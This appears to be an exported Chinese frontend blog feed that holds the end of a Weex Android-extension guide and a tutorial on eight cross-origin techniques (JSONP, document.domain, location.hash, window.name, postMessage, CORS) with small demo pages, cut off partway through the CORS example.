<p>文件替换<br>点击控制台顶部的 环境设置 菜单，可针对weex页面运行的依赖文件进行修改替换，修改完成后依次点击生成文件 -&gt; 更改设置 即可对运行环境进行替换。<br><img src="https://mfaying.github.io/static/images/weex/28.jpg" alt=""><br>如果你在使用过程中遇到了什么问题，可以到这里提交isssue进行反馈, 同时你也可以在这里搜索是否有已解决的方案。</p>
<h2 id="拓展Android能力"><a href="#拓展Android能力" class="headerlink" title="拓展Android能力"></a>拓展Android能力</h2><p>Weex 提供了扩展机制，可以根据自己的业务进行定制自己的功能。 主要分为两类扩展：</p>
<p>Module 扩展 非 UI 的特定功能。例如 sendHttp、openURL 等。<br>Component 扩展 实现特别功能的 Native 控件。例如：RichTextview，RefreshListview 等。<br>Adapter 扩展 Weex 对一些基础功能实现了统一的接口，可实现这些接口来定制自己的业务。例如：图片下载等。<br>JS全局变量自定义扩展</p>
<h2 id="JSEnv-扩展"><a href="#JSEnv-扩展" class="headerlink" title="JSEnv 扩展"></a>JSEnv 扩展</h2><p>接口<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Object&gt; options = <span class="keyword">new</span> HashMap();</span><br><span class="line">options.set(<span class="string">"testVlaue"</span>,<span class="string">"hello"</span>);</span><br><span class="line"><span class="comment">//.... </span></span><br><span class="line">instance.render(pagename, template,options);</span><br></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var value = weex.config.testValue;</span><br><span class="line"></span><br><span class="line">console.log(value);</span><br></pre></td></tr></table></figure></p>
<h2 id="Module-扩展"><a href="#Module-扩展" class="headerlink" title="Module 扩展"></a>Module 扩展</h2><p>Module 扩展必须继承 WXModule 类。<br>扩展方法必须加上@JSMethod (uiThread = false or true) 注解。Weex 会根据注解来判断当前方法是否要运行在 UI 线程，和当前方法是否是扩展方法。<br>Weex是根据反射来进行调用 Module 扩展方法，所以Module中的扩展方法必须是 public 类型。<br>同样因为是通过反射调用，Module 不能被混淆。请在混淆文件中添加代码：-keep public class <em> extends com.taobao.weex.common.WXModule{</em>;}<br>Module 扩展的方法可以使用 int, double, float, String, Map, List 类型的参数<br>完成 Module 后一定要在初始化时注册 WXSDKEngine.registerModule(“myModule”, MyModule.class); 否则会报类似错误：ReportException :undefined:9: TypeError: Object #<Object> has no method ‘printLog’<br>示例如下：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyModule</span> <span class="keyword">extends</span> <span class="title">WXModule</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//run ui thread</span></span><br><span class="line">  <span class="meta">@JSMethod</span> (uiThread = <span class="keyword">true</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printLog</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    Toast.makeText(mWXSDKInstance.getContext(),msg,Toast.LENGTH_SHORT).show();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//run JS thread</span></span><br><span class="line">  <span class="meta">@JSMethod</span> (uiThread = <span class="keyword">false</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fireEventSyncCall</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="comment">//implement your module logic here</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">Register the <span class="keyword">module</span></span><br><span class="line"></span><br><span class="line">WXSDKEngine.registerModule(<span class="string">"MyModule"</span>, MyModule<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure></p>
<p>Register the module</p>
<p>WXSDKEngine.registerModule(“MyModule”, MyModule.class);<br>JS 调用如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;text onclick=<span class="string">"click"</span>&gt;testMyModule&lt;<span class="regexp">/text&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  module.exports = &#123;</span></span><br><span class="line"><span class="regexp">    methods: &#123;</span></span><br><span class="line"><span class="regexp">      click: function() &#123;</span></span><br><span class="line"><span class="regexp">        weex.requireModule('MyModule').printLog("I am a weex Module");</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="Module-注册"><a href="#Module-注册" class="headerlink" title="Module 注册"></a>Module 注册</h2><p>registerModule(moduleName,moduleClass)</p>
<p>return(bool): 是否注册成功<br>moduleName(String): 模块名称<br>moduleClass(Class): 模块对应的class，创建module实例时使用<br>使用方式:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WXSDKEngine.registerModule(&quot;picker&quot;, WXPickersModule.class);</span><br></pre></td></tr></table></figure></p>
<h2 id="Component-扩展"><a href="#Component-扩展" class="headerlink" title="Component 扩展"></a>Component 扩展</h2><p>weex版本 &gt;= 0.19.0<br>变更说明<br>WXDomObject 和 Layout 引擎被下沉到 WeexCore 中使用 C++ 实现，移除 Java 代码中的 WXDomObject。此次变更涉及 WXComponent 和 WXDomObject 的适配。</p>
<p>迁移指南</p>
<p>setMeasureFunction 迁移<br>WXDomObject 中的 setMeasureFunction() 方法迁移至 WXComponent 中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected void setMeasureFunction(final ContentBoxMeasurement contentBoxMeasurement);</span><br></pre></td></tr></table></figure></p>
<p>详见：com.taobao.weex.layout.ContentBoxMeasurement.java</p>
<p>ContentBoxMeasurement 示例请参考：WXText.java / setMeasureFunction() 注意：ContentBoxMeasurement 只支持叶子节点。</p>
<p>WXComponent 接口变更</p>
<p>getDomObject [移除]<br>由于 WXDomObject 下沉至 WeexCore 中，所以 getDomObject() 方法已被删除。</p>
<p>构造方法 [参数变更]<br>WXComponent 的构造方法删除了类型为 WXDomObject 的参数，新增了类型为 BasicComponentData 的参数，其余参数保持不变：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public WXComponent(WXSDKInstance instance, WXVContainer parent, int type, BasicComponentData basicComponentData);</span><br></pre></td></tr></table></figure></p>
<p>WXDomObject 接口变更<br>你无法在Java代码中访问和继承 WXDomObject，（ ImmutableDomObject 接口也已被删除）</p>
<p>WXDomObject 的部分方法被迁移至 WXComponent中，如需使用，如下：</p>
<h1 id="WXDomObject-getType-gt-WXComponent-getComponentType-迁移"><a href="#WXDomObject-getType-gt-WXComponent-getComponentType-迁移" class="headerlink" title="WXDomObject.getType() -&gt; WXComponent.getComponentType() [迁移]"></a>WXDomObject.getType() -&gt; WXComponent.getComponentType() [迁移]</h1><p>WXDomObject 中 的 getType() 方法用于获取组件类型（如：list、div、text、img…），迁移到 WXComponent 后，更名为：</p>
<p>public WXCompon</p>
<p>#</p>
</style></p>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>week</tag>
      </tags>
  </entry>
  <entry>
    <title>跨域的八种实现方案</title>
    <url>/2019/10/11/%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>由于同源策略的限制，满足同源的脚本才可以获取资源。虽然这样有助于保障网络安全，但另一方面也限制了资源的使用。<br>那么如何实现跨域呢，以下是实现跨域的一些方法。<br><a id="more"></a></p>
<h1 id="一、jsonp跨域"><a href="#一、jsonp跨域" class="headerlink" title="一、jsonp跨域"></a>一、jsonp跨域</h1><p>原理：script标签引入js文件不受跨域影响。不仅如此，带src属性的标签都不受同源策略的影响。</p>
<p>正是基于这个特性，我们通过script标签的src属性加载资源，数据放在src属性指向的服务器上，使用json格式。</p>
<p>由于我们无法判断script的src的加载状态，并不知道数据有没有获取完成，所以事先会定义好处理函数。服务端会在数据开头加上这个函数名，等全部加载完毕，便会调用我们事先定义好的函数，这时函数的实参传入的就是后端返回的数据了。</p>
<p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/jsonp" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/jsonp</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/jsonp/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/jsonp/index.html</a></p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line">      alert(data.test);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jsonp.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>jsonp.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">callback(&#123;<span class="string">"test"</span>: <span class="number">0</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<p>访问index.html弹窗便会显示0</p>
<p>该方案的缺点是：只能实现get一种请求。</p>
<h1 id="二、document-domain-iframe跨域"><a href="#二、document-domain-iframe跨域" class="headerlink" title="二、document.domain + iframe跨域"></a>二、document.domain + iframe跨域</h1><p>此方案仅限主域相同，子域不同的应用场景。</p>
<p>比如百度的主网页是<a href="http://www.baidu.com，zhidao.baidu.com、news.baidu.com等网站是www.baidu.com这个主域下的子域。" target="_blank" rel="noopener">www.baidu.com，zhidao.baidu.com、news.baidu.com等网站是www.baidu.com这个主域下的子域。</a></p>
<p>实现原理：两个页面都通过js设置document.domain为基础主域，就实现了同域，就可以互相操作资源了。<br>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/document-domain" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/document-domain</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/document-domain/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/document-domain/index.html</a></p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://mfaying.github.io/lesson/cross-origin/document-domain/child.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'mfaying.github.io'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> t = <span class="string">'0'</span>;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>child.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'mfaying.github.io'</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">window</span>.parent.t);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="三、location-hash-iframe跨域"><a href="#三、location-hash-iframe跨域" class="headerlink" title="三、location.hash + iframe跨域"></a>三、location.hash + iframe跨域</h1><p>父页面改变iframe的src属性，location.hash的值改变，不会刷新页面(还是同一个页面)，在子页面可以通过window.localtion.hash获取值。</p>
<p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/location-hash" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/location-hash</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/location-hash/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/location-hash/index.html</a></p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"child.html#"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oIf = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'iframe'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      oIf.src += <span class="string">'0'</span>;</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>child.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      alert(<span class="built_in">window</span>.location.hash.slice(<span class="number">1</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>点击index.html页面弹窗便会显示0</p>
<h1 id="四、window-name-iframe跨域"><a href="#四、window-name-iframe跨域" class="headerlink" title="四、window.name + iframe跨域"></a>四、window.name + iframe跨域</h1><p>原理：window.name属性在不同的页面（甚至不同域名）加载后依旧存在，name可赋较长的值（2MB）。</p>
<p>在iframe非同源的页面下设置了window的name属性，再将iframe指向同源的页面，此时window的name属性值不变，从而实现了跨域获取数据。<br>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/window-name" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/window-name</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/window-name/parent/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/window-name/parent/index.html</a></p>
<p>./parent/index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oIf = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">    oIf.src = <span class="string">'https://mfaying.github.io/lesson/cross-origin/window-name/child.html'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    oIf.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">      if (state === 0) &#123;</span><br><span class="line">        state = 1;</span><br><span class="line"><span class="javascript">        oIf.src = <span class="string">'https://mfaying.github.io/lesson/cross-origin/window-name/parent/proxy.html'</span>;</span></span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">JSON</span>.parse(oIf.contentWindow.name).test);</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(oIf);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>./parent/proxy.html<br>空文件，仅做代理页面<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">./child.html</span><br><span class="line">```html</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">'&#123;"test": 0&#125;'</span></span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="五、postMessage跨域"><a href="#五、postMessage跨域" class="headerlink" title="五、postMessage跨域"></a>五、postMessage跨域</h1><p>postMessage是HTML5提出的，可以实现跨文档消息传输。</p>
<p>用法<br>getMessageHTML.postMessage(data, origin);<br>data： html5规范支持的任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。<br>origin： 协议+主机+端口号，也可以设置为”*”，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p>
<p>getMessageHTML是我们对于要接受信息页面的引用，可以是iframe的contentWindow属性、window.open的返回值、通过name或下标从window.frames取到的值。</p>
<p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/postMessage" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/postMessage</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/postMessage/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/postMessage/index.html</a></p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'ifr'</span> <span class="attr">src</span>=<span class="string">'./child.html'</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">'btn'</span>&gt;</span>click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'btn'</span>);</span></span><br><span class="line"><span class="javascript">      btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);</span></span><br><span class="line"><span class="javascript">        ifr.contentWindow.postMessage(<span class="number">0</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="literal">false</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>child.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line">        alert(event.data);</span><br><span class="line"><span class="javascript">      &#125;, <span class="literal">false</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>点击index.html页面上的按钮，弹窗便会显示0。</p>
<h1 id="六、跨域资源共享（CORS）"><a href="#六、跨域资源共享（CORS）" class="headerlink" title="六、跨域资源共享（CORS）"></a>六、跨域资源共享（CORS）</h1><p>只要在服务端设置Access-Control-Allow-Origin就可以实现跨域请求，若是cookie请求，前后端都需要设置。<br>由于同源策略的限制，所读取的cookie为跨域请求接口所在域的cookie，并非当前页的cookie。</p>
<p>CORS是目前主流的跨域解决方案。</p>
<h2 id="原生node-js实现"><a href="#原生node-js实现" class="headerlink" title="原生node.js实现"></a>原生node.js实现</h2><p>示例代码：<a href="https://github.com/mfaying/lesson/tree/master/cross-origin/cors" target="_blank" rel="noopener">https://github.com/mfaying/lesson/tree/master/cross-origin/cors</a><br>演示网址：<a href="https://mfaying.github.io/lesson/cross-origin/cors/index.html" target="_blank" rel="noopener">https://mfaying.github.io/lesson/cross-origin/cors/index.html</a>(访问前需要先执行node server.js命令启动本地服务器)</p>
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.4.1.min.js"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">integrity</span>=<span class="string">"sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="</span></span></span><br><span class="line"><span class="tag">    <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $.<span class="keyword">get</span>('http://localhost:8080', function (data) &#123;</span></span><br><span class="line">      alert(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span 